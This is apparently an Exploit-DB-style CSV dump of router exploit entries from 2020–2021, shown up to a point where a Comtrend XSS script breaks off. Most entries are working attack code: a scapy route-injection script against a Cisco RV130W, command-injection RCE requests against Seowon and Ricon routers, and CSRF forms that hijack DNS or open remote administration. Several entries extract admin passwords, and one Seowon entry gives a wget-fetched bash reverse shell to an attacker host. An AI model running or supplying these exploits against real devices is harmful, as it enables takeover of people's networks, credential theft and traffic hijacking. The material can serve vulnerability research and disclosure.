User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0)
Gecko/20100101 Firefox/65.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://192.168.1.1/
X-Requested-With: XMLHttpRequest
Connection: close
************************Response************************
HTTP/1.1 200 OK
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Date: Thu, 24 Jun 2021 02:07 GMT+2
Connection: Keep-Alive
Content-Language: en
Content-Type: application/javascript
Content-Length: 141
while(1); /*{""DeviceName"":""DG8045"",""SerialNumber"":""21530369847SK9252081"",""ManufacturerOUI"":""00E0FC"",""UpTime"":81590,""HardwareVersion"":""VER.A""}*/"
2021-09-27,Remote,Hardware,Michael Alamoot,Cisco small business RV130W 1.0.3.44,Inject Counterfeit Routers,"# Exploit Title: Cisco small business RV130W 1.0.3.44 - Inject Counterfeit Routers
# Date: 24/09/2021
# Exploit Author: Michael Alamoot
# Vendor Homepage: https://www.cisco.com/
# Version: RV130W 1.0.3.44
# Tested on: Kali linux
#! /usr/bin/env python3","from scapy.contrib.eigrp import EIGRPAuthData
from scapy.contrib.eigrp import EIGRPIntRoute
from scapy.contrib.eigrp import EIGRPGeneric
from scapy.contrib.eigrp import EIGRPSeq
from scapy.contrib.eigrp import EIGRP
from scapy.layers.vrrp import VRRPv3
from scapy.layers.vrrp import VRRP
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP
from scapy.sendrecv import sendp
from scapy.volatile import RandMAC
from scapy.all import conf
import socket,networkx,os
import argparse,sys,asyncio
class argX:
def __init__(self):
self.parser = argparse.ArgumentParser(description=""..."")
self.parser.add_argument(
""-i"",""--ip"",
help=""ip router fake injection"",
dest=""ip"",
self.parser.add_argument(
""-r"",""--ip-router"",
help=""ip router root"",
dest=""router"",
default=conf.route.route('0.0.0.0')[2]
def argvX(self):
"""""" [0] ip-router [1] ip-fake """"""
args = self.parser.parse_args()
ip = args.ip
route = args.router
return [ip,route]
class exploit(object):
def __new__(cls,*args,**kwargs):
return super(exploit,cls).__new__(cls)
def __init__(self,IProuter,InjectFackeRouter):
self.IProuter = IProuter
self.InjectFackeRouter = InjectFackeRouter
self.MAC = RandMAC()
def pyload(self):
pyload = Ether()/IP(src=self.IProuter,dst=""224.0.0.18"")\
/VRRPv3(version=3,type=1,vrid=1,priority=100,res=0,adv=100,addrlist=self.InjectFackeRouter)\
/IP(src=self.IProuter,dst=""224.0.0.10"") \
/EIGRP(opcode=""Update"",asn=100,seq=0,ack=0
,tlvlist=[EIGRPIntRoute(dst=self.InjectFackeRouter,nexthop=self.IProuter)])
return pyload
def start(self,count=[0,100]):
for i in range(count[0],count[1]):
sendp(self.pyload(),verbose=0,return_packets=False,inter=0,loop=0)
print(f""\033[41m PACKET \033[0m Injection fake routers {self.IProuter} {self.InjectFackeRouter} \033[31m{i}\033[0m"")
if __name__ == ""__main__"":
a = argX().argvX()
if a[0]:
net1 = exploit(IProuter=a[1],InjectFackeRouter=a[0])
net1.start()
else:
print(""[-h] [--help]"")"
2021-09-15,WebApps,Hardware,Aryan Chehreghani,Seowon 130-SLC router,'queriesCnt' Remote Code Execution (Unauthenticated),"# Exploit Title: Seowon 130-SLC router - 'queriesCnt' Remote Code Execution (Unauthenticated)
# Date: 2021-09-15
# Exploit Author: Aryan Chehreghani
# Vendor Homepage: http://www.seowonintech.co.kr
# Software Link: http://www.seowonintech.co.kr/en/product/detail.asp?num=150&big_kindB05&middle_kindB05_29
# Version: All Version
# Tested on: Windows 10 Enterprise x64 , Linux
# [ About - Seowon 130-SLC router ] :
#The SLC-130 series are all-in-one LTE CPE that delights you in handling multi-purpose environments that require data and WiFi,
#Its sophisticated and stable operation helps you excel yourself at office and home,
#Improve communication with excellence and ease your life.
# [ Description ]:
#Execute commands without authentication as admin user ,
#To use it in all versions, we only enter the router ip & Port(if available) in the request
#The result of the request is visible on the browser page
# [ Sample RCE Request ] :","POST / HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0 Cyberfox/52.9.1
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.1.1:443/diagnostic.html?t=201701020919
Content-Length: 183
Cookie: product=cpe; cpe_buildTime=201701020919; vendor=mobinnet; connType=lte;
cpe_multiPdnEnable=1; cpe_lang=en; cpe_voip=0; cpe_cwmpc=1; cpe_snmp=1; filesharing=0;
cpe_switchEnable=0; cpe_IPv6Enable=0; cpe_foc=0; cpe_vpn=1; cpe_httpsEnable=0;
cpe_internetMTUEnable=0; cpe_opmode=lte; sessionTime=1631653385102; cpe_login=admin
Connection: keep-alive
Command=Diagnostic&traceMode=trace&reportIpOnly=0&pingPktSize=56&pingTimeout=30&pingCount=4&ipAddr=&maxTTLCnt=30&queriesCnt=;ls&reportIpOnlyCheckbox=on&btnApply=Apply&T=1631653402928"
2021-07-05,WebApps,Hardware,LiquidWorm,Ricon Industrial Cellular Router S9922XL,Remote Command Execution (RCE),"# Exploit Title: Ricon Industrial Cellular Router S9922XL - Remote Command Execution (RCE)
# Date: 02.07.2021
# Exploit Author: LiquidWorm
# Vendor Homepage: https://www.riconmobile.com
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Ricon Industrial Cellular Router S9922XL Remote Command Execution
# Vendor: Ricon Mobile Inc.
# Product web page: https://www.riconmobile.com
# Affected version: Model: S9922XL and S9922L
#                   Firmware: 16.10.3
# Summary: S9922L series LTE router is designed and manufactured by
# Ricon Mobile Inc., it based on 3G/LTE cellular network technology
# with industrial class quality. With its embedded cellular module,
# it widely used in multiple case like ATM connection, remote office
# security connection, data collection, etc.
# The S9922XL-LTE is a mobile network router based on 4G/4.5G, WiFi
# and VPN technologies. Powerful 64-bit Processor and integrated real-time
# operating system specially developed by Ricon Mobile. S9922XL is
# widely used in many areas such as intelligent transportation, scada,
# POS, industrial automation, telemetry, finance, environmental protection.
# Desc: The router suffers from an authenticated OS command injection
# vulnerability. This can be exploited to inject and execute arbitrary
# shell commands as the admin (root) user via the 'ping_server_ip' POST
# parameter. Also vulnerable to Heartbleed.
# --------------------------------------------------------------------
# C:\>python ricon.py 192.168.1.71 id
# uid=0(admin) gid=0(admin)
# --------------------------------------------------------------------
# Tested on: GNU/Linux 2.6.36 (mips)
#            WEB-ROUTER
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#                             @zeroscience
# Advisory ID: ZSL-2021-5653
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5653.php
# 02.07.2021","import requests,sys,re
if len(sys.argv)<3:
print(""Ricon Industrial Routers RCE"")
print(""Usage: ./ricon.py [ip] [cmd]"")
sys.exit(17)
else:
ipaddr=sys.argv[1]
execmd=sys.argv[2]
data={'submit_class'  :'admin',
'submit_button' :'netTest',
'submit_type'   :'',
'action'        :'Apply',
'change_action' :'',
'is_ping'       :'0',
'ping_server_ip':';'+execmd}
htreq=requests.post('http://'+ipaddr+'/apply.cgi',data=data,auth=('admin','admin'))
htreq=requests.get('http://'+ipaddr+'/asp/admin/netTest.asp',auth=('admin','admin'))
reout=re.search(""20\"">(.*)</textarea>"",htreq.text,flags=re.S).group(1).strip('\n')
print(reout)"
2021-06-09,WebApps,Hardware,Rodolfo Mariano,Intelbras Router RF 301K,'DNS Hijacking' Cross-Site Request Forgery (CSRF),"# Exploit Title: Intelbras Router RF 301K - 'DNS Hijacking' Cross-Site Request Forgery (CSRF)
# Date: 01/05/2021
# Exploit Author: Rodolfo Mariano
# Version: Firmware 1.1.2-1.1.5
# CVE: 2021-32403
# Exploit Code:","<html>
<form action=""http://10.0.0.1/goform/setSysTools"" method=""POST"">
<input name=""module3"" value=""lanCfg"" type=""hidden"">
<input name=""lanIP"" value=""10.0.0.1"" type=""hidden"">
<input name=""lanMask"" value=""255.255.255.0"" type=""hidden"">
<input name=""dhcpEn"" value=""true"" type=""hidden"">
<input name=""lanDhcpStartIP"" value=""10.0.0.100"" type=""hidden"">
<input name=""lanDhcpEndIP"" value=""10.0.0.200"" type=""hidden"">
<input name=""lanDns1"" value=""192.168.0.30"" type=""hidden"">
<input name=""lanDns2"" value="""" type=""hidden"">
</form>
<script>
document.forms[0].submit();
</script>
</html>"
2021-04-21,WebApps,Hardware,Rodolfo Mariano,Multilaser Router RE018 AC1200,Cross-Site Request Forgery (Enable Remote Access),"# Exploit Title: Multilaser Router RE018 AC1200 - Cross-Site Request Forgery (Enable Remote Access)
# Date: 14/04/2021
# Exploit Author: Rodolfo Mariano
# Version: Firmware V02.03.01.45_pt
# CVE: 2021-31152
# Exploit Code:","<html>
<body>
<form action=""http://192.168.0.1/goform/setSysTools"" method=""POST"">
<input name=""module4"" value=""remoteWeb"" type=""hidden"">
<input name=""remoteWebType"" value=""any"" type=""hidden"">
<input name=""remoteWebIP"" value="""" type=""hidden"">
<input name=""remoteWebPort"" value=""8888"" type=""hidden"">
<input type=""submit"" value=""Submit request"">
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>"
2021-04-13,WebApps,Multiple,Jai Kumar Sharma,ExpressVPN VPN Router 1.0,Router Login Panel's Integer Overflow,"# Exploit Title: ExpressVPN VPN Router 1.0 - Router Login Panel's Integer Overflow
# Date: 09-04-2021
# Exploit Author: Jai Kumar Sharma
# Vendor Homepage: https://www.expressvpn.com/
# Software Link: https://www.expressvpn.com/vpn-software/vpn-router
# Version: version 1
# Tested on: Windows/Ubuntu/MacOS
# CVE : CVE-2020-29238","*Proof of concept*:
ExpressVPN Router's Login Panel runs on Nginx webserver, the version v1 of the router's firmware hosts web login panel on vulnerable web server
ExpressVPN Summary: A publicly known bug in the Nginx server used by the ExpressVPN Router version 1.x firmware was reported. ExpressVPN no longer ships or supports that version and all users are encouraged to upgrade to the latest version of the ExpressVPN Router firmware available on our site, which is not vulnerable to this bug. Additionally, we highly discourage our users from exposing their router control panel to the Internet, as this class of bug would only be exploitable with access to the control panel, which is usually restricted to the local network. For help or support upgrading your router please visit: https://www.expressvpn.com/support/
ExpressVPN Router version 1 is vulnerable to integer overflow vulnerability in Nginx range filter module resulting into leak of potentially sensitive information triggered by specially crafted request.
Crafted Request:
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0)
Gecko/20100101 Firefox/81.0
Host: 127.0.0.1:8181
Accept-Encoding: identity
Range: bytes=-17208,-9223372036854758999
Connection: close
Response:
HTTP/1.1 206 Partial Content
Server: nginx/1.9.15
Date: Tue, 10 Nov 2020 19:22:05 GMT
Content-Type: multipart/byteranges; boundary=00000000002
Content-Length: 598
Last-Modified: Thu, 13 Sep 2018 04:55:28 GMT
Connection: close
ETag: ""5b99edc0-99f""
--00000000002
Content-Type: text/html
Content-Range: bytes -14745-2462/2463"
2021-04-02,WebApps,Hardware,LiquidWorm,ZBL EPON ONU Broadband Router 1.0,Remote Privilege Escalation,"# Exploit Title: ZBL EPON ONU Broadband Router 1.0 - Remote Privilege Escalation
# Date: 31.01.2021
# Exploit Author: LiquidWorm
# Vendor Homepage: http://www.zblchina.com http://www.wd-thailand.com
Summary: EONU-x GEPON ONU layer-3 home gateway/CPE broadband
Desc: The application suffers from a privilege escalation
#web_1","Vendor: Zhejiang BC&TV Technology Co., Ltd. (ZBL) | W&D Corporation (WAD TECHNOLOGY (THAILAND))
Product web page: http://www.zblchina.com | http://www.wd-thailand.com
Affected version: Firmwre: V100R001
Software model: HG104B-ZG-E / EONU-7114 / ZBL5932C CATV+PON Triple CPE
EONU Hardware VersionV3.0
Software: V2.46.02P6T5S
Main Chip: RTL9607
Master Controller, Copyright (c) R&D
router.
vulnerability. The limited administrative user (admin:admin)
can elevate his/her privileges by sending a HTTP GET request
to the configuration backup endpoint or the password page
and disclose the http super user password. Once authenticated
as super, an attacker will be granted access to additional and
privileged functionalities.
Tested on: GoAhead-Webs/2.5.0 PeerSec-MatrixSSL/3.1.3-OPEN
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2021-5467
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5647.php
31.01.2021
Get config file and disclose super pwd:
POST /HG104B-ZG-E.config HTTP/1.1
Host: 192.168.1.1
Connection: keep-alive
Content-Length: 42
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://192.168.1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://192.168.1.1/system_configure.asp
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,mk;q=0.8,sr;q=0.7,hr;q=0.6
CMD=CONFIG&GO=index.asp&TYPE=CONFIG&files=
user_web_name=super
user_web_password=www168nettv
Disclose super pwd from system pwd page:
GET /system_password.asp
Host: 192.168.1.1
var webVars = new Array( 'HG104B-ZG-E', '1', '0','2;1;2');
var sysadmin = new Array('600','1;super;www168nettv','1;admin;admin');"
2021-03-11,WebApps,Hardware,LiquidWorm,NuCom 11N Wireless Router 5.07.90,Remote Privilege Escalation,"# Exploit Title: NuCom 11N Wireless Router 5.07.90 - Remote Privilege Escalation
# Date: 01.03.2021
# Exploit Author: LiquidWorm
# Vendor Homepage: https://www.nucom.es
Summary: The NC routers upgrades your network to the next
Desc: The application suffers from a privilege escalation","Vendor: NUEVAS COMUNICACIONES IBERIA, S.A.
Product web page: https://www.nucom.es
Affected version: 5.07.90_multi_NCM01
5.07.89_multi_NCM01
5.07.72_multi_NCM01
generation of WiFi. With combined wireless speeds of up to
1750 Mbps, the device provides better speeds and wireless
range. Includes 2 FXS ports for any VoIP service. If you
prefer a wired connection, the NC routers have gigabit
ports to provide an incredibly fast, lag-free experience.
3.0 ports allow you to power a robust home Internet network
by sharing printers, flash storage, FTP servers, or media
players.
vulnerability. The non-privileged default user (user:user)
can elevate his/her privileges by sending a HTTP GET request
to the configuration backup endpoint and disclose the http
super password (admin credentials) in Base64 encoded value.
Once authenticated as admin, an attacker will be granted
access to the additional and privileged pages.
Tested on: GoAhead-Webs
Tenda
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2021-5629
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5629.php
01.03.2021
lqwrm@metalgear:~/prive$ echo -e '\nThe admin password is: ' ; \
> curl -s http://192.168.0.1:8080/cgi-bin/DownloadNoMacaddrCfg/RouterCfm.cfg?random=0.251 \
> -H 'Cookie: ecos_pw=dXNlcg==1311930653:language=en' | \
> grep -oP '(?<=http_supper_passwd=).*' | \
> base64 -d 2>/dev/null | \
> xargs echo -n ; \
> echo -e '\n-----------\n'
The admin password is:
MammaMia123
lqwrm@metalgear:~/prive$"
2020-11-30,WebApps,Hardware,Kaio Amaral,Intelbras Router RF 301K 1.1.2,Authentication Bypass,"# Exploit Title: Intelbras Router RF 301K 1.1.2 - Authentication Bypass
# Date: 27/11/2020
# Exploit Author: Kaio Amaral
# Vendor Homepage: https://www.intelbras.com/pt-br/
# Software Link: http://backend.intelbras.com/sites/default/files/2020-10/RF301K_v1.1.2.zip
# Version: firmware version 1.1.2
# Tested on: kali, android
# POC
# 1. nc host port, ex: nc 10.0.0.1 80
# 2. GET /cgi-bin/DownloadCfg/RouterCfm.cfg HTTP/1.0
# Python3","import socket
from time import sleep
def exploit(host, port=80):
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
pay = ""GET /cgi-bin/DownloadCfg/RouterCfm.cfg HTTP/1.0\n\n"".encode()
s.connect((host, port))
s.send(pay)
sleep(0.2)
data = s.recv(17576)
if len(data) > 1000:
print(""[+] Success."")
return data.decode()
print(""[-] Failed. "")
exit()
def file(data):
with open(""router.cfg"", ""w"") as file:
file.write(data[233:])
print(""[+] File Successfully Written."")
file(exploit(""10.0.0.1""))"
2020-11-24,WebApps,Hardware,maj0rmil4d,Seowon 130-SLC router 1.0.11,'ipAddr' RCE (Authenticated),"# Exploit Title: Seowon 130-SLC router 1.0.11 - 'ipAddr' RCE (Authenticated)
# Date: 5 Aug 2020
# Exploit Author: maj0rmil4d
# Vendor Homepage: http://www.seowonintech.co.kr/en/
# Hardware Link: http://www.seowonintech.co.kr/en/product/detail.asp?num=150&big_kindB05&middle_kindB05_29
# Version: 1.0.11 (Possibly all versions)","The default user/pass is admin/admin
your commands run as root user
the vulnerablity is on the ipAddr parameter in system_log.cgi
Usage:
login to the dashboard.
setup your listener.
download the revshell.txt with the RCE
run the revshell.txt
* here is the RCE request :
POST /cgi-bin/system_log.cgi? HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/201=
00101 Firefox/79.0
Accept: */*
Accept-Language: en-US,en;q0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 183
Origin: http://192.168.1.1
Connection: close
Referer: http://192.168.1.1/diagnostic.html?t201802140812
Cookie: productcpe; cpe_buildTime201802140812; vendormobinnet; =
connTypelte; modelCodeSLC_130G; cpe_multiPdnEnable1; cpe_langen=
; cpe_voip0; cpe_cwmpc1; cpe_snmp1; filesharing0; cpe_switchEna=
ble0; cpe_vlanEnable1; cpe_IPv6Enable1; cpe_foc0; cpe_vpn1; =
cpe_httpsEnable0; cpe_internetMTUEnable0; cpe_sleepMode0; cpe_wlan=
Enable1; cpe_simRestriction0; cpe_opmode1; sessionTime159664408=
4662; cpe_loginadmin; _lang
CommandDiagnostic&traceModetrace&reportIpOnly0&pingPktSize56=
&pingTimeout30&pingCount4&ipAddr;id&maxTTLCnt30&queriesCnt3&=
reportIpOnlyCheckboxon&btnApplyApply&T1596644096617
* to get a reverse shell, setup the listener and download the file on the r=
outer then run it .
* the content of the revshell.txt :
bash -i >& /dev/tcp/192.168.1.10/45214 0>&1
* to download :
POST /cgi-bin/system_log.cgi? HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/201=
00101 Firefox/79.0
Accept: */*
Accept-Language: en-US,en;q0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 183
Origin: http://192.168.1.1
Connection: close
Referer: http://192.168.1.1/diagnostic.html?t201802140812
Cookie: productcpe; cpe_buildTime201802140812; vendormobinnet; =
connTypelte; modelCodeSLC_130G; cpe_multiPdnEnable1; cpe_langen=
; cpe_voip0; cpe_cwmpc1; cpe_snmp1; filesharing0; cpe_switchEna=
ble0; cpe_vlanEnable1; cpe_IPv6Enable1; cpe_foc0; cpe_vpn1; =
cpe_httpsEnable0; cpe_internetMTUEnable0; cpe_sleepMode0; cpe_wlan=
Enable1; cpe_simRestriction0; cpe_opmode1; sessionTime159664408=
4662; cpe_loginadmin; _lang
CommandDiagnostic&traceModetrace&reportIpOnly0&pingPktSize56=
&pingTimeout30&pingCount4&ipAddr;wget http://192.168.1.10/revshell=
.txt&maxTTLCnt30&queriesCnt3&reportIpOnlyCheckboxon&btnApplyApp=
ly&T1596644096617
* to run it :
POST /cgi-bin/system_log.cgi? HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/201=
00101 Firefox/79.0
Accept: */*
Accept-Language: en-US,en;q0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 183
Origin: http://192.168.1.1
Connection: close
Referer: http://192.168.1.1/diagnostic.html?t201802140812
Cookie: productcpe; cpe_buildTime201802140812; vendormobinnet; =
connTypelte; modelCodeSLC_130G; cpe_multiPdnEnable1; cpe_langen=
; cpe_voip0; cpe_cwmpc1; cpe_snmp1; filesharing0; cpe_switchEna=
ble0; cpe_vlanEnable1; cpe_IPv6Enable1; cpe_foc0; cpe_vpn1; =
cpe_httpsEnable0; cpe_internetMTUEnable0; cpe_sleepMode0; cpe_wlan=
Enable1; cpe_simRestriction0; cpe_opmode1; sessionTime159664408=
4662; cpe_loginadmin; _lang
CommandDiagnostic&traceModetrace&reportIpOnly0&pingPktSize56=
&pingTimeout30&pingCount4&ipAddr;bash revshell.txt&maxTTLCnt30&=
queriesCnt3&reportIpOnlyCheckboxon&btnApplyApply&T1596644096617"
2020-11-19,Remote,Hardware,Nitesh Surana,Genexis Platinum 4410 Router 2.1,UPnP Credential Exposure,"# Exploit Title: Genexis Platinum 4410 Router 2.1 - UPnP Credential Exposure
# Date: 17th November 2020
# Exploit Author: Nitesh Surana
# Vendor Homepage: https://www.gxgroup.eu/ont-products/
# Version: P4410-V2-1.34H
# Tested on: Windows/Kali
# CVE : CVE-2020-25988
# Discover UPnP devices on the network
# Returns a list of devices e.g.: [Device <Econet IGD>]
# Select the device directly from the list
# Get the services available for this device
# Returns a list of services available for the device
# device.get_services()
# We can now access a specific service on the device by its ID like a dictionary
# Execute the action by its name (in our case, the 'X_GetAccess' action)
# Returns a dictionary containing the cleartext password of 'admin' user.","import upnpy
upnp = upnpy.UPnP()
devices = upnp.discover()
device = devices[0]
service = device['DeviceInfo1']
print(""Admin Password: {}"".format(service.X_GetAccess()['NewX_RootPassword']))"
2020-10-20,WebApps,Hardware,OscarAkaElvis,Comtrend AR-5387un router,Persistent XSS (Authenticated),"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Dependencies and libraries
# Global class vars","Exploit Title: Persistent XSS on Comtrend AR-5387un router
Date: 19/10/2020
Exploit Author: OscarAkaElvis
Vendor Homepage: https://www.comtrend.com/
Version: Comtrend AR-5387un router
Tested on: Software/Firmware version A731-410JAZ-C04_R02.A2pD035g.d23i
CVE: CVE-2018-8062
Disclosure timeline:
08/03/2018: Vulnerability was discovered
10/03/2018: Reported to Mitre (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8062)
11/03/2018: Mitre answered, CVE number reserved
11/03/2018: Reported to Comtrend as part of responsible disclosure, they never answered
16/10/2020: Two years later, reported again to Comtrend and public disclosure (https://twitter.com/OscarAkaElvis/status/1317004119509471233)
18/10/2020: Exploit creation
19/10/2020: Exploit sent to exploit-db
Exploitation explanation:
To exploit this vulnerability, once logged into the router, a WAN service must be created
Click on ""Advanced Setup"", ""WAN Service"". ""Add button"", ""Next""
Then insert the payload into the ""Enter Service Description"" field. This was used for the PoC <script>alert('xss');</script>
Then click on ""Next"" four times to go on through the steps and finally click on ""Apply/Save""
The result of the XSS will be displayed and triggered on the WAN services page
This exploit automatize the entire process bypassing CSRF protection and allowing to set a custom XSS payload
Happy hacking :)
OscarAkaElvis - https://twitter.com/OscarAkaElvis
import requests
from requests.auth import HTTPBasicAuth
import re
from sys import argv, exit
import argparse
from os import path
from time import sleep
class Exploit(object):
session = requests.Session()
user_agent = ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Safari/537.36""
ip = None
username = None
password = None
payload = None
default_ip = ""192.168.1.1""
default_username = ""admin""
default_password = ""admin""
default_payload = ""<script>alert('xss');</script>""
exploit_version = ""1.0""
current_sessionkey = None
referer_sessionkey = None
script_name = path.basename(argv[0])
description_text = 'CVE-2018-8062 exploit by OscarAkaElvis, Persistent XSS on Comtrend AR-5387un router'
epilog_text = 'Examples:\n    python3 ' + script_name + ' -i 192.168.0.150\n    python3 ' + script_name + ' -u admin -p mySecureRouterP@ss\n    python3 ' + script_name + ' -i 10.0.0.1 -u admin -p mySecureRouterP@ss -x \'<script>evil_js_stuff</script>\''
def start_msg(self):
print(""[*] Starting CVE-2018-8062 exploit..."")
sleep(0.5)
def check_params(self, arguments):
parser = argparse.ArgumentParser(description=self.description_text, formatter_class=argparse.RawDescriptionHelpFormatter, epilog=self.epilog_text)
parser.add_argument('-i', '--ip', dest='ip', required=False, help=""set router's ip"", metavar='IP')
parser.add_argument('-u', '--username', dest='username', required=False, help=""set user to login on router"", metavar='USERNAME')
parser.add_argument('-p', '--password', dest='password', required=False, help=""set password to login on router"", metavar='PASSWORD')
parser.add_argument('-x', '--xss-payload', dest='payload', required=False, help=""set xss payload"", metavar='PAYLOAD')
parser.add_argument('-v', '--version', action='version', version=self.print_version(), help=""show exploit's version number and exit"")
args = parser.parse_args(arguments)
self.start_msg()
print(""[*] Launch the exploit using -h argument to check all the available options"")
print()
if not args.ip:
self.ip = self.default_ip
print(""[!] Warning, no ip set, default will be used: "" + str(self.ip))
else:
self.ip = args.ip
if not args.username:
self.username = self.default_username
print(""[!] Warning, no username set, default will be used: "" + str(self.username))
else:
self.username = args.username
if not args.password:
self.password = self.default_password
print(""[!] Warning, no password set, default will be used: "" + str(self.password))
else:
self.password = args.password
if not args.payload:
self.payload = self.default_payload
print(""[!] Warning, no XSS payload set, PoC default will be used: "" + str(self.payload))
else:
self.password = args.password
def print_version(self):
print()
return 'v{}'.format(self.exploit_version)
def check_router(self):
try:
print()
print(""[*] Trying to detect router..."")
headers = {""User-Agent"": self.user_agent}
response = self.session.get(""http://"" + str(self.ip) + ""/"", headers=headers)
if re.match(r'.*WWW-Authenticate.*Broadband Router.*', str(response.headers)):
print(""[+] Comtrend router detected successfully"")
else:
print()
print(""[-] It seems the target is not a Comtrend router"")
print(""[*] Exiting..."")
exit(1)
except (TimeoutError, ConnectionError, requests.exceptions.ConnectionError):
print()
print(""[-] Can't connect to the router"")
print(""[*] Exiting..."")
exit(1)
def check_login(self):
print()
print(""[*] Trying to login..."")
headers = {""User-Agent"": self.user_agent}
response = self.session.get(""http://"" + str(self.ip) + ""/"", headers=headers, auth=HTTPBasicAuth(self.username, self.password))
if response.status_code != 401:
print(""[+] Login successfully!"")
sleep(1)
else:
print()
print(""[-] Can't login into the router. Check your creds!"")
print(""[*] Exiting..."")
exit(1)
def get_sessionKey(self, response_text):
sessionKey = re.search(r'.*sessionKey=([0-9]+).*', str(response_text))
if sessionKey is not None:
sessionKey = sessionKey.group(1)
else:
sessionKey = re.search(r'.*sessionKey=\\\'([0-9]+).*', str(response_text), re.MULTILINE)
if sessionKey is not None:
sessionKey = sessionKey.group(1)
return sessionKey
def step1(self):
print()
print(""[*] Performing step 1/8. Getting initial sessionKey to bypass CSRF protection..."")
headers = {""User-Agent"": self.user_agent}
response = self.session.get(""http://"" + str(self.ip) + ""/wancfg.cmd"", headers=headers, auth=HTTPBasicAuth(self.username, self.password))
self.current_sessionkey = self.get_sessionKey(response.content)
print(""[+] Success! Initial sessionKey: "" + self.current_sessionkey)
sleep(1)
def step2(self):
print()
print(""[*] Performing step 2/8..."")
paramsGet = {""sessionKey"": self.current_sessionkey, ""serviceId"": ""0""}
headers = {""User-Agent"": self.user_agent, ""Referer"": ""http://"" + str(self.ip) + ""/wancfg.cmd""}
response = self.session.get(""http://"" + str(self.ip) + ""/wanifc.cmd"", params=paramsGet, headers=headers, auth=HTTPBasicAuth(self.username, self.password))
self.referer_sessionkey = self.current_sessionkey
self.current_sessionkey = self.get_sessionKey(response.content)
sleep(1)
def step3(self):
print()
print(""[*] Performing step 3/8..."")
paramsGet = {""sessionKey"": self.current_sessionkey, ""wanL2IfName"": ""atm0/(0_8_35)""}
headers = {""User-Agent"": self.user_agent, ""Referer"": ""http://"" + str(self.ip) + ""/wanifc.cmd?serviceId=0&sessionKey="" + self.referer_sessionkey}
response = self.session.get(""http://"" + str(self.ip) + ""/wansrvc.cmd"", params=paramsGet, headers=headers, auth=HTTPBasicAuth(self.username, self.password))
self.referer_sessionkey = self.current_sessionkey
self.current_sessionkey = self.get_sessionKey(response.content)
sleep(1)
def step4(self):
print()
print(""[*] Performing step 4/8..."")
paramsGet = {""vlanMuxPr"": ""-1"", ""sessionKey"": self.current_sessionkey, ""vlanMuxId"": ""-1"", ""ntwkPrtcl"": ""0"", ""enVlanMux"": ""1"", ""enblEnetWan"": ""0"", ""serviceName"": self.payload}
headers = {""User-Agent"": self.user_agent, ""Referer"": ""http://"" + str(self.ip) + ""/wansrvc.cmd?wanL2IfName=atm0/(0_8_35)&sessionKey="" + self.referer_sessionkey}
response = self.session.get(""http://"" + str(self.ip) + ""/pppoe.cgi"", params=paramsGet, headers=headers, auth=HTTPBasicAuth(self.username, self.password))
self.referer_sessionkey = self.current_sessionkey
self.current_sessionkey = self.get_sessionKey(response.content)
sleep(1)
def step5(self):
print()
print(""[*] Performing step 5/8..."")
paramsGet = {""useStaticIpAddress"": ""0"", ""pppLocalIpAddress"": ""0.0.0.0"", ""sessionKey"": self.current_sessionkey, ""enblIgmp"": ""0"", ""enblFullcone"": ""0"", ""pppTimeOut"": ""0"", ""pppAuthErrorRetry"": ""0"", ""pppServerName"": """", ""enblPppDebug"": ""0"", ""pppPassword"": """", ""enblNat"": ""0"", ""enblOnDemand"": ""0"", ""pppUserName"": """", ""pppIpExtension"": ""0"", ""enblFirewall"": ""0"", ""pppAuthMethod"": ""0"", ""pppToBridge"": ""0""}
